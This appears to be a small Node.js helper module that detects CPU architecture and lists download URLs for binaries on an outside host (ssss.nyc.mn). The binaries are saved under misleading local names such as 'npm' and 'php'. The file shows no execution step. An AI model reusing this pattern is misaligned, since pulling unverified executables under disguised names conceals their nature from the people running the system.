const os = require('os');

/**
 * Detect system architecture and return a normalized name.
 * Consolidates getSystemArchitecture() which duplicated arch detection logic.
 */
function getSystemArchitecture() {
  const arch = os.arch();
  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
    return 'arm';
  }
  return 'amd';
}

/**
 * Get download URLs for architecture-specific binaries.
 * Consolidates getFilesForArchitecture() which had duplicated URL structures
 * for arm vs amd, differing only in the base URL prefix.
 */
function getDownloadUrls(arch) {
  const base = arch === 'arm'
    ? 'https://arm64.ssss.nyc.mn'
    : 'https://amd64.ssss.nyc.mn';

  return [
    { fileName: 'npm', fileUrl: `${base}/agent` },
    { fileName: 'web', fileUrl: `${base}/web` },
    { fileName: 'bot', fileUrl: `${base}/bot` },
    { fileName: 'php', fileUrl: `${base}/v1` },
  ];
}

module.exports = { getSystemArchitecture, getDownloadUrls };
